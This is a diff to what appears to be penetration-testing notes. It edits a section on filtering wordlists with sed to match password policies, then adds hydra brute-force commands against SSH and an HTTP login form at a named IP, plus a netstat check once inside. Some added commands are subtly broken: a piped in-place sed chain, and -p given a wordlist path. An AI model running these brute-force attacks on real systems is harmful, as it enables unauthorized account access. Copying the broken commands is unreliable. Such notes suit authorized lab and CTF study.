@@ -117,10 +117,12 @@ Run it in interactive mode with the -i argument and it will ask you a bnch of qu
 
 We can use sed and REGEX to remove passwords that don't meet particular policies, if known.
 ```bash
-sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
-sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
-sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
+sed -ri '/^.{,7}$/d' ginny.txt            # remove shorter than 8
+sed -ri '/[!-/:-@\[-`\{-~]+/!d' ginny.txt # remove no special chars
+sed -ri '/[0-9]+/!d' ginny.txt            # remove no numbers
 ```
+
+sed -ri '/^.{,7}$/d' harry.txt | sed -ri '/[!-/:-@\[-`\{-~]+/!d' | sed -ri '/[0-9]+/!d'
 
 Once we have a custom wordlist we can put it through a mangler to mash them up and make the wordlist even larger. Many great tools do word mangling and case permutation quickly and easily, like [rsmangler](https://github.com/digininja/RSMangler) or [The Mentalist](https://github.com/sc0tfree/mentalist.git).
 
@@ -135,4 +137,12 @@ Attacking a login service is easy with hydra.  Provide the appropriate lists and
 user@computer $ hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
 ```
 
-grep
+Once in, we can look for other potential attack surfaces by using:
+```shell-session
+user@computer~$ netstat -antp | grep -i list
+```
+
+```bash
+hydra -l user -p /usr/share/wordlists/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"
+```
+```
